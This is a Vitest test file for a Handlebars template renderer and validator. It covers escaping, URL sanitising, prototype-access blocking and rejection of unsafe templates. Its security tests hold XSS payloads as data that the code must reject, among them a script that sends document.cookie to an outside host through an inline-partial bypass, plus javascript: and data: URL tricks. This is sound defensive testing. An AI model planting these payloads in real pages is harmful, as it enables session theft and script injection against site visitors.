import { describe, it, expect } from 'vitest';
import { renderTemplate, validateTemplate, TemplateError, type TemplateContext } from '../src/template.js';

const ctx: TemplateContext = {
  company: { name: 'Acme & Co', address: { city: 'Berlin' } },
  website: { siteUrl: 'https://acme.test' },
  page: { title: 'Home', published: '2026-06-01T12:00:00Z' },
  data: {
    products: [
      { name: 'Widget', price: 9 },
      { name: 'Gadget', price: 12 },
    ],
    tags: ['a', 'b'],
    featured: true,
    empty: [],
  },
};

describe('renderTemplate — Handlebars features', () => {
  it('passes literal HTML through and interpolates + HTML-escapes values', () => {
    expect(renderTemplate('<div class="grid">{{ page.title }}</div>', ctx)).toBe('<div class="grid">Home</div>');
    expect(renderTemplate('{{ company.name }}', ctx)).toBe('Acme &amp; Co');
    expect(renderTemplate('{{ company.address.city }}', ctx)).toBe('Berlin');
  });

  it('escapes an HTML-bearing value (XSS-safe in body/quoted attr)', () => {
    expect(renderTemplate('{{ page.t }}', { page: { t: '<script>alert(1)</script>' } })).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;',
    );
  });

  it('supports {{#if}}/{{else}} and {{#unless}}', () => {
    expect(renderTemplate('{{#if data.featured}}Y{{else}}N{{/if}}', ctx)).toBe('Y');
    expect(renderTemplate('{{#if data.empty}}Y{{else}}N{{/if}}', ctx)).toBe('N');
    expect(renderTemplate('{{#unless page.missing}}ok{{/unless}}', ctx)).toBe('ok');
  });

  it('supports {{#each}} with @index/@first/@last and item fields', () => {
    expect(renderTemplate('{{#each data.products}}{{@index}}:{{name}}{{#unless @last}}, {{/unless}}{{/each}}', ctx)).toBe(
      '0:Widget, 1:Gadget',
    );
    expect(renderTemplate('{{#each data.tags}}[{{this}}]{{/each}}', ctx)).toBe('[a][b]');
  });

  it('supports {{#each}} @key over an object and block params', () => {
    const c: TemplateContext = { data: { obj: { a: 1, b: 2 } } };
    expect(renderTemplate('{{#each data.obj as |v k|}}{{k}}={{v}};{{/each}}', c)).toBe('a=1;b=2;');
  });

  it('supports {{#with}}, {{lookup}}, subexpressions, and @root', () => {
    expect(renderTemplate('{{#with company.address}}{{city}}{{/with}}', ctx)).toBe('Berlin');
    expect(renderTemplate('{{#each data.products}}{{ lookup ../data.tags @index }}{{/each}}', ctx)).toBe('ab');
    expect(renderTemplate('{{#each data.products}}{{ @root.company.name }} {{/each}}', ctx)).toBe('Acme &amp; Co Acme &amp; Co ');
  });

  it('renders partials in the current scope (incl. inside each)', () => {
    const c: TemplateContext = { ...ctx, partials: { card: '<li>{{name}} ({{price}})</li>' } };
    expect(renderTemplate('<ul>{{#each data.products}}{{> card}}{{/each}}</ul>', c)).toBe(
      '<ul><li>Widget (9)</li><li>Gadget (12)</li></ul>',
    );
  });
});

describe('renderTemplate — curated helpers (extensibility)', () => {
  it('{{date}} formats a date (default + iso)', () => {
    expect(renderTemplate('{{date page.published}}', ctx)).toBe('2026-06-01');
    expect(renderTemplate('{{date page.published "iso"}}', ctx)).toBe('2026-06-01T12:00:00.000Z');
    expect(renderTemplate('{{date page.nope}}', ctx)).toBe('');
  });

  it('{{url}} sanitizes the scheme', () => {
    expect(renderTemplate('<a href="{{url page.link}}">x</a>', { page: { link: 'javascript:alert(1)' } })).toBe(
      '<a href="#">x</a>',
    );
    expect(renderTemplate('<a href="{{url page.link}}">x</a>', { page: { link: 'https://ok.test/a' } })).toBe(
      '<a href="https://ok.test/a">x</a>',
    );
  });

  it('{{truncate}} clips long text', () => {
    expect(renderTemplate('{{truncate page.t 5}}', { page: { t: 'abcdefgh' } })).toBe('abcd…');
    expect(renderTemplate('{{truncate page.t 5}}', { page: { t: 'abc' } })).toBe('abc');
  });
});

describe('renderTemplate — security', () => {
  it('disables prototype access', () => {
    expect(renderTemplate('[{{ company.constructor }}]', ctx)).toBe('[]');
    expect(renderTemplate('[{{ company.__proto__ }}]', ctx)).toBe('[]');
  });

  it('does not re-evaluate a value that looks like a tag (no injection from data)', () => {
    const c: TemplateContext = { page: { title: '{{ company.secret }}' }, company: { secret: 'LEAK' } };
    expect(renderTemplate('{{ page.title }}', c)).toBe('{{ company.secret }}');
  });

  it('caps output size', () => {
    const c: TemplateContext = { data: { items: Array.from({ length: 5000 }, () => 'xxxxxxxxxx') } };
    expect(() => renderTemplate('{{#each data.items}}{{this}}{{/each}}', c, { maxOutput: 1000 })).toThrow(TemplateError);
  });
});

describe('validateTemplate — context-aware rejection (Handlebars is not context-aware)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('bans raw {{{ }}} output', () => {
    rejects('<p>{{{ page.html }}}</p>');
  });

  it('rejects interpolation in an unquoted attribute', () => {
    rejects('<div class={{ data.cls }}>x</div>');
  });

  it('rejects interpolation in event-handler and style attributes', () => {
    rejects('<button onclick="{{ data.x }}">x</button>');
    rejects('<div style="color:{{ data.c }}">x</div>');
  });

  it('rejects interpolation in <script>, <style>, and HTML comments', () => {
    rejects('<script>var x = {{ data.x }};</script>');
    rejects('<style>.a { color: {{ data.c }} }</style>');
    rejects('<!-- {{ page.title }} -->');
  });

  it('requires {{url …}} (not a bare value) inside URL attributes', () => {
    rejects('<a href="{{ page.link }}">x</a>');
    allows('<a href="{{url page.link}}">x</a>');
    allows('<a href="/p/{{ page.slug }}">x</a>'); // literal prefix fixes the scheme → allowed
  });

  it('allows interpolation in element text and quoted non-URL attributes', () => {
    allows('<p data-x="{{ data.v }}">{{ data.v }}</p>');
    allows('{{#each data.products}}<span>{{name}}</span>{{/each}}'); // block tags are not output mustaches
  });

  it('renderTemplate runs the validator (rejects an unsafe template before rendering)', () => {
    expect(() => renderTemplate('<div class={{ data.cls }}>x</div>', ctx)).toThrow(TemplateError);
  });
});

describe('validateTemplate — no tenant JS + URL scheme (security-review fixes)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('rejects a <script> element even with no interpolation', () => {
    rejects('<p>hi</p><script>alert(1)</script>');
  });

  it('rejects a <script> hidden inside an {{#*inline}} partial body (the inline-partial bypass)', () => {
    rejects('{{#*inline "x"}}<script>fetch("//e/"+document.cookie)</script>{{/inline}}{{> x}}');
  });

  it('rejects inline on* event-handler attributes (literal or interpolated)', () => {
    rejects('<div onmouseover="steal()">x</div>');
    rejects('<button onclick="{{ data.x }}">x</button>');
  });

  it('rejects a URL whose scheme a bare literal prefix does NOT fix', () => {
    rejects('<a href="j{{ data.rest }}">x</a>'); // assembles javascript:
    rejects('<a href="//{{ data.host }}">x</a>'); // protocol-relative
    rejects('<img src="data:{{ data.b64 }}">'); // data: scheme
  });

  it('still allows safe URL prefixes and the {{url}} helper', () => {
    allows('<a href="/p/{{ page.slug }}">x</a>');
    allows('<a href="https://x.test/{{ page.slug }}">x</a>');
    allows('<a href="#{{ page.frag }}">x</a>');
    allows('<a href="{{url page.link}}">x</a>');
  });

  it('neuters the {{log}} helper (no stdout disclosure)', () => {
    // log is unregistered → {{log x}} no longer writes the value to stdout; it errors instead.
    expect(() => renderTemplate('{{log company.name}}', { company: { name: 'Acme' } })).toThrow(TemplateError);
  });
});
